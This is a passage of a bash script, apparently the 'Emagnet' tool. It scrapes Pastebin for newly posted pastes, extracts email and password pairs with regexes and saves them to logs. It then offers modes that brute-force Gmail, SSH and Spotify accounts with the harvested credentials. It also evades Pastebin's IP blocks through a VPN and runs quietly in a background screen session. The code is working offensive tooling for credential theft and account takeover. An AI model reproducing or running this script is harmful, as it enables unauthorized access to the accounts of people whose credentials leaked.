			exit
     	fi

curl -H "$USERAGENT" -Ls $PASTEBIN|grep -q "blocked your IP"
if [[ $? = "0" ]]; then
 if [[ $VPN = "true" ]]; then
      banned
 else
      clear; banner
      echo -e "[\e[1;31m<<\e[0m] - You have been blocked by pastebin"
      echo -e "[\e[1;31m<<\e[0m] - Enable a vpn or please try again later, aborted\n"
      exit 1
 fi
fi
      curl -Ls https://pastebin.com/languages \
      |grep -o 'href="/archive/............' \
      |cut -d'<' -f1 \
      |cut -d'/' -f3 \
      |cut -d'"' -f1 > /tmp/.emagnet-syntaxes

read -p "Syntax (ex: python): " SYNTAX2DL
if [[ -z $SYNTAX2DL ]]; then
      echo -e "$basename$0: internal error -- you must choose a syntax language to download, aborted.."
      exit 1
fi

curl -Ls $PASTEBIN/$SYNTAX2DL \
|grep -o '<a href="/........' \
|cut -d'/' -f2 \
|grep -E '[0-9]{1,4}' > /tmp/.emagnet-syntaxes-urls

grep -q "$SYNTAX2DL" /tmp/.emagnet-syntaxes

if [[ "$?" = "0" ]]; then
     printf "Downloading $(cat /tmp/.emagnet-syntaxes-urls|wc -l) ${SYNTAX2DL} files.."
     mkdir -p "$EMAGNETSYNTAX/$SYNTAX2DL"
     cat /tmp/.emagnet-syntaxes-urls|xargs -P $THREADS wget -nc -q -P "$EMAGNETSYNTAX/$SYNTAX2DL" &> /dev/null
     printf "\nDone.\n\n" | tr ' ' '.'
     rm /tmp/.emagnet-syntaxes-urls /tmp/.emagnet-syntaxes &> /dev/null
else
      echo -e "$basename$0: internal error -- $SYNTAX2DL is not a valid syntax language..\n"
      echo -e "try 'cat /tmp/.emagnet-syntaxes' for find valid syntaxes"
      exit 1
      rm /tmp/.emagnet-syntaxes-urls /tmp/.emagnet-syntaxes &> /dev/null
fi
}

emagnet2() {
			if [[ -z $USERAGENT ]]; then
				echo -e "$basename$0: internal errror -- you must set a useragent in $CONF"
				exit
         	fi
curl -H "$USERAGENT" -Ls $PASTEBIN/archive \
|awk -F'href="/' '{print $2}' \
|cut -d'"' -f1 \
|awk 'length($0)>6 && length($0)<9' \
|grep -v 'archive\|contact\|settings\|messages\|signup\|index.html' \
|awk '{print tolower($0)}' > /tmp/.emagnet1
 ls -1 $EMAGNETALL \
|sort > 1
 cat /tmp/.emagnet1 \
|sort \
|cut -d/ -f5 > 2
 grep  -v -x -F -f 1 2  \
|awk -F, '!seen[$1]++' \
|sed "s/^/https:\/\/pastebin.com\/raw\//g" > /tmp/.emagnet
rm 1 2 &> /dev/null

if [[ $(cat /tmp/.emagnet1|wc -l) = "8" ]]; then
     noticeaboutscraping
fi

# If we didn't grab anything, check for ban
if [[ "$(cat /tmp/.emagnet1|grep https)" = "0" ]]; then 
  heavyload
  Iwasbanned
fi

cat /tmp/.emagnet \
|xargs -P $THREADS wget -q -nc -P $EMAGNETTEMP &> /dev/null

# Cause bash is bash
tt="$(cat /tmp/.emagnet| wc -l)"
  if [[ $tt -lt "10" ]]; then 
      tt="0$tt"
  fi

if [[ "${tt}" -eq "00" ]]; then 
  curl -Ls $PASTEBIN|grep -q "blocked"
    if [[ $? = "0" ]]; then
      heavyload
      Iwasbanned
    fi

printf "[\e[1;31m<<\e[0m] - No new files could be downloaded..\n[\e[1;31m<<\e[0m] - Increase time or you will get banned within seconds..\n\n"
      tt="\e[1;31m\e[5m00\e[0m"
      sleep 5
      clear
      banner
else 
echo -e "\n======================================\nPastebin URLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n======================================"  >> $EMAGNETLOGS/pastebin-urls.txt
     cat /tmp/.emagnet >> $EMAGNETLOGS/pastebin-urls.txt
fi

#### REGEX FOR MAIL ONLY
i=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b'  $EMAGNETTEMP|cut -d: -f1|tr ' ' '\n') # Email addresses
il=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|cut -d: -f2|tr ' ' '\n') # Email addresses we will send to logs without filename
it=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|wc -l|tr ' ' '\n')       # Amount email addresses

# REGEX FOR MAIL + PASSWORD
p=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'|tr ' ' '\n')
pl=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S' |sed 's/|/:/g'|tr ' ' '\n')
pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v '/'|wc -l)

    ((10#0$it > 00))
    ((10#0$pt > 00))

if [[ ${pt} -gt "0" ]] && [[ ${it} -gt "0" ]]; then
    echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: $(whoami) - Found: ${pt} passwords from: $EMAGNETPW/${i##*/}" | xargs >> $EMAGNETLOGS/emagnet.log
    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP \
    |awk '{print $1}'\
    |cut -d':' -f2,3\
    |cut -d'|' -f1\
    |uniq \
    |uniq \
    |grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'\|'index.html'\|'alerts'\| \
    |grep -v '/' >> $EMAGNETLOGS/passwords-from-pastebin.txt 
    
    grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP \
    |cut -d':' -f2 \
    |uniq >> $EMAGNETLOGS/emails-from-pastebin.txt

    printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
    printf "%19s[\e[1;32m$pt\e[0m] - Passwords Found\n\n"
    printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"

if [[ $NOTIFY = "true" ]]; then
    notify-send "Emagnet" "\n$tt - Files downloaded\n $pt - Passwords found\n$it - Email addresses found"
fi
      cp -rn ${p} $EMAGNETPW/ &> /dev/null
      cp -rn ${i} "$EMAGNETDB/" &> /dev/null
      sleep 2

if [[ "$GBRUTEFORCE" = "true" ]]; then
   printf "%64s \n\n" | tr ' ' '='
   printf "%14s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mO\e[1;33mO\e[1;34mG\e[0;32mL\E[1;31mE\e[0m") ACCOUNTS\e[0m\n\n"
   bruter
   sleep 2
elif [[ "$SBRUTEFORCE" = "true" ]]; then
   printf "%64s \n\n" | tr ' ' '='
   printf "%14s";printf "BRUTE FORCING -- SSH ACCOUNTS\e[0m\n\n"
   sshbruter
   sleep 2
elif [[ "$PBRUTEFORCE" = "true" ]]; then
   printf "%64s \n\n" | tr ' ' '='
   printf "%17s";printf "BRUTE FORCING -- SPOTIFY ACCOUNTS\e[0m\n\n"
   spotifybruter
   sleep 2
else
   sleep 0
fi

# When we found email addresses without any password then we only echo email files
cp -rn $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
    elif [[ $pt = "00" ]] && [[ $it -gt "00" ]]; then
         echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: $(whoami) - Found \e[1;36m$it\e[0m emails from $EMAGNETDB/${i##*/}"|xargs >> $EMAGNETLOGS/emagnet.log
         grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|cut -d':' -f2 \|uniq >> $EMAGNETLOGS/emails-from-pastebin.txt
         sleep 2
         # Now copy them to email-files path
         cp $i $EMAGNETDB/ &> /dev/null;
                    
                    if [[ $SBRUTEFORCE = "true" ]]; then
                          cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
                    elif [[ $GBRUTEFORCE = "true" ]]; then
                          cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
                    elif [[ $PBRUTEFORCE = "true" ]]; then
                          cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
                    else
                          mv $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
                    fi

        printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
        printf "%19s[\e[1;31m00\e[0m] - Passwords Found\n\n"
        printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"

            if [[ $NOTIFY = "true" ]]; then
                   notify-send "Emagnet" "\n$tt - Files downloaded\n 00 - Passwords found\n$it - Email addresses found"
            fi
                   sleep 5
else
        printf "%17s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
        printf "%17s[\e[1;31m00\e[0m] - No Passwords Was Found\n\n"
        printf "%17s[\e[1;31m00\e[0m] - No Email Address Was Found\n\n"

            if [[ "$NOTIFY" = "true" ]]; then
               notify-send "Emagnet" "\n$tt - Files downloaded\n00 - Passwords found\n00 - Email addresses found"
            fi
               sleep 3.2
fi
               pkill -9 notify-send &> /dev/null
               rm "/tmp/.emagnet*" &> /dev/null
}

dontstopwhenfound() {
conf
curl -sL $PASTEBIN|grep -q "blocked your IP"
if [[ $? = "0" ]]; then 
   if [[ $VPN = "true" ]]; then 
       banned
    else
       Iwasbanned
   fi
fi

for (( ; ; )); do 
  conf
  countdown
  clear
  banner
  analyz
  clear
  banner
  emagnet2
  conf
       if [[ "$GBRUTEFORCE" = "true" ]]; then
         bruter
         mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
         rm "/tmp/.emagnet*"  &> /dev/null
       elif [[ "$SBRUTEFORCE" = "true" ]]; then
         sshbruter
         mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
         rm "/tmp/.emagnet*"  &> /dev/null
       elif [[ "$PBRUTEFORCE" = "true" ]]; then 
         spotifybruter
         mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
         rm "/tmp/.emagnet*" &> /dev/null
       else
         mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
         rm "/tmp/.emagnet*"  &> /dev/null
       fi
done
}


### CHECK4ALL
check4all() {
     conf
     mustbefilled
     paths
     Iwasbanned
     conf
}

( [[ -z $1 ]] && usage; exit 1 )


case $1 in
     "-a"|"-author"|"--author")
          author
     ;;
"emagnet"|"-e"|"-emagnet"|"--emagnet")
conf
iconnection
        sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' "$CONF"
        sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' "$CONF"
        sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
                clear
                banner
                check4all
       PWD="$(pwd)"
		if [[ $GBRUTEFORCE = "false" ]]; then 
			 dontstopwhenfound
		elif [[ $sBRUTEFORCE = "false" ]]; then 
 			 dontstopwhenfound
		elif [[ $PBRUTEFORCE = "false" ]]; then 
  			 dontstopwhenfound
 		else
 			 mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
		fi
		;;

"-g"|"-bruteforce"|"--bruteforce")
check4all
sleep 0.5
if [[ $2 = "gmail" ]]; then
        conf
        sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
        conf
        if [[ $GBRUTEFORCE = "true" ]]; then
        clear
        banner
        printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        dontstopwhenfound
        bruter
        mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
        fi
elif [[ $2 = "ssh" ]]; then
        conf
        sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
        conf
        if [[ $SBRUTEFORCE = "true" ]]; then
        clear
        banner
        printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        dontstopwhenfound
        sshbruter
        fi
        mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
elif [[ $2 = "spotify" ]]; then
         conf
         find /usr/include -type d |grep 'libspotify' &> /dev/null
         if [[ "$?" -ne "0" ]]; then
        	 if [[ -z $LIBSPOTIFY ]]; then
	        	 printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
         		 read LIBSPOTIFY
        			 if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
        				 echo "Can't continue until libspotify has been installed.."
      					 echo "Exiting.."
       					 exit 1
         			 fi
        	 sed -i '210d' "$CONF"
                 sed -i '210 i LIBSPOTIFY=true' "$CONF"
         fi
         else
        	 sed -i '210d' "$CONF"
                 sed -i '210 i LIBSPOTIFY=true' "$CONF"
         fi
         ./sconsify -version &> /dev/null
         if [[ $? -ne "0" ]]; then
         echo "Sconsify is required to be installed before we attacking targets.."
           read -p "Download and install sconsify (y/N): " installsconsify
             if [[ $installsconsify -eq "y" ]]; then
                echo -e "Hold on, downloading sconsify.."
                wget -q "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
                echo -e "Unzipping sconsify into current dir.."
                unzip -q -o linux-x86_64-sconsify-0.6.0-next.zip
                chmod +x sconsify
                echo -e "Cleaning up."..
                rm linux-x86_64-sconsify-0.6.0-next.zip
                echo "All done, going to continue in 5 seconds.."
                sleep 5
        else
              echo "Cant bruteforce without sconsify, please choose another option.."
              exit 1
        fi
fi
        sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' "$CONF"
        conf
        if [[ $PBRUTEFORCE = "true" ]]; then
        clear
        banner
        printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        dontstopwhenfound
        printf "\n%64s \n\n" | tr ' ' '='
        spotifybruter
        fi
        mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
else
       printf "emagnet: internal error -- you must include ssh, spotify or gmail\n"
       exit 1
fi
;;


"-k"|"-kill"|"--kill")
ESESSIONS=$(ps aux|grep -i "emagnet"|sed '$d'|awk '{print $2}')
NRESESSIONS=$(ps aux|grep -i "emagnet"|sed '$d'|awk '{print $2}'|wc -l)
NRINSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g'|wc -l)"
INSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g')"

 		if [[ $INSCREEN -gt "0" ]]; then
   			for screens in $INSCREEN; do
      			screen -X -S $screens kill
   		   		if [[ $? = "0" ]]; then
 			       		echo -e "[\e[1;31m<<\e[0m] - $NRINSCREEN emagnet screens has been killed\n"
      			fi
   			done
		fi

if [[ $NRESESSIONS -lt "3" ]]; then
     echo -e "$basename$0: internal error -- 0 emagnet sessions is currently running"
else
     echo -e "$basename$0: killed $(echo $NRESESSIONS-2|bc) emagnet sessions"
     kill -SIGKILL $ESESSIONS &> /dev/null
fi 
;;

"-i"|"--ip"|"-ip"|"ip") curl https://nr1.nu/i/ ;;
"-h"|"--help"|"-help"|"help") usage ;;
"-l"|"-license"|"--license") printf "%s\n" "Printing LICENSE - Use 'q' to quit";sleep 2;curl -s https://nr1.nu/licenses/LICENSE.md|less;printf "%s\n" "Thank you.." ;;
"-m"|"-move"|"--move") conf;check4all;moveem                                                             ;;
"-s"|"-spam"|"--spam") conf;check4all;emagnetspammer                                                     ;;
"-x"|"-syntax"|"--syntax") conf;check4all;clear;banner;emagnetsyntax                                     ;;
"-q"|"-quiet"|"--quiet") conf;check4all;pid="$(ps aux |grep emagnet)" rm -rf /tmp/screen;screen -S emagnet -dm bash emagnet --emagnet
                         printf "[\e[1;32m>>\e[0m] - Emagnet has been started in background (pid:$(ps aux|grep "SCREEN -dmS emagnet"|awk '{print $2}'|head -n1))\n" ;;
"version"|"-version"|"--version"|"-V") printf "Emagnet Version: v$VERSION\n\n" 			 ;;

"-t"|"-time"|"--time")
     conf

if [[ -z $2 ]]; then
     echo "emagnet: internal error -- time require a number to be used"
     exit 1
fi

re='^[0-9]+$'
if ! [[ $2 =~ $re ]] ; then
   echo -e "emagnet: internal error -- that's not a valid number" >&2; exit 1
fi
     sed -i '30d' "$CONF"
     sed -i "30 i TIME=$2" "$CONF"
     printf "emagnet: config file has been updated -- time has been set to: $2 s\n"
     exit 1
;;

"-n"|"-notify"|"--notify")
conf
     notify-send --help &> /dev/null
     if [[ $? -gt "0" ]]; then
        echo -e "$basename$0: internal error -- notify-send is required for get notifications"
        exit 1
     fi

      if [[ -z $2 ]]; then
       echo -e "$basename$0: internal error -- you must use true or false"
       exit 1
     fi
     if [[ $? -eq "0" ]] && [[ $2 = "true" ]]; then
        sed -i '137d' "$CONF"
        sed -i "137 i NOTIFY=true" "$CONF"
        printf "$basename$0: config file has been updated -- notifications has been enable\n"
     fi

     if [[ $? -eq "0" ]] && [[ $2 = "disable" ]]; then
        sed -i '137d' "$CONF"
        sed -i "137 i NOTIFY=false" "$CONF"
        printf "$basename$0: config file has been updated -- notifications has beendisable\n"
     fi
;;

 "-v"|"-vpn"|"--vpn")
conf
if [[ $VPNPROVIDER = "$VPNROOT/" ]]; then 
    echo -e "$basename$0: internal error -- you must set a vpn provider before you can enable vpn";exit 1;fi
if [[ -z $2 ]]; then echo -e "emagnet: internal error -- you must include true or false";exit 1;fi
if [[ $2 = "true" ]] || [[ $2 = "on" ]] || [[ $2 = "enable" ]]; then
     sed -i '150d' "$CONF";sed -i "150i VPN=true" "$CONF";echo -e "emagnet: config file has been updated -- vpn has been enabled";exit 1
elif [[ $2 = "false" ]] || [[ $2 = "off" ]] || [[ $2 = "disable" ]]; then
     sed -i '150d' "$CONF";sed -i "150i VPN=false" "$CONF";echo -e "emagnet: config file has been updated -- vpn has been disabled";exit 1
else echo -e "emagnet: internal error -- $2 is an unknown option -- valid options is true or false"
     exit 1;fi
;;

"-b"|"-backup"|"--backup")
    clear;banner;conf

if [[ ! -d $EMAGNETBACKUP ]]; then
   mkdir -p $EMAGNETBACKUP
fi

if [[ ! -d "$EMAGNET" ]]; then
    echo "[\e[1;32m<<\e[0m] - Duh! Can't do anything since no emagnet folder exists, aborted.."
exit 1
fi

if [[ -f "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz" ]] && [[ -f "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz" ]] && -f "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz" ]]; then
         echo "You have already created a backup today.."
         read -p "Do you want to overwrite the old backup (yes/no) " overwriteoldbackup
    if [[ $overwriteoldbackup = "yes" ]]; then
if [[ $* = "all" ]]; then
         rm "$EMAGNETBACKUP/emagnet-$(date +%d%m%Y).tar.gz"
         echo -e "Removed old backup.."
         echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -ne "0" ]]; then
             tar -cf - --absolute-names "$EMAGNET"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz"
         else
             tar -cjf "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz" "$EMAGNET"
         fi
elif [[ $* = "incoming" ]]; then
         rm "$EMAGNETBACKUP/emagnet-$(date +%d%m%Y).tar.gz"
         echo -e "Removed old backup.."
         echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
            tar -cf - --absolute-names "$EMAGNET/incoming"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz"
         else
            tar -cjf "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz" "$EMAGNET/incoming"
         fi
elif [[ $* = "archive" ]]; then
         echo -e "Removed old backup.."
        echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
              tar -cf - --absolute-names "$EMAGNETBACKUP"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz"
         else
              tar -cjf "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz" "$EMAGNETBACKUP"
         fi
else
         printf "emagnet: error -- please specify incoming, archive or all\n\n"
         exit 1
fi
    else
         printf "Aborted..\n"
fi
    exit 1
fi

if [[ $2 = "all" ]]; then
       echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ "$?" = "0" ]]; then
            tar -cf - --absolute-names "$EMAGNET"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz"
         else
            tar -cjf "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz" "$EMAGNET"
         fi

elif [[ $2 = "incoming" ]]; then
       echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ "$?" = "0" ]]; then
            tar -cf - --absolute-names "$EMAGNET/incoming"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz"
         else
            tar -cjf "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz" "$EMAGNET/incoming"
         fi

elif [[ $2 = "archive" ]]; then
         pigz -h &> /dev/null
         if [[ "$?" -eq "0" ]]; then
              tar -cf - --absolute-names "$EMAGNETBACKUP"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz"
         else 
              tar -cjf "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz" "$EMAGNETBACKUP"
         fi  

else
         echo -e "emagnet: error -- please specify incoming, archive or all\n"
         exit 1
fi
      printf "\nBackup has successfully been compressed..\nBackup: $EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz .\n\n"

;;

	"\?")       
    clear
    banner
    printf "emagnet: internal error -- use --help for available commands'\n\n"
    exit 1 ;;


   	"*") 
     clear
     banner
    printf "emagnet: internal error -- use --help for available commands'\n\n"
    exit 1 ;;
esac

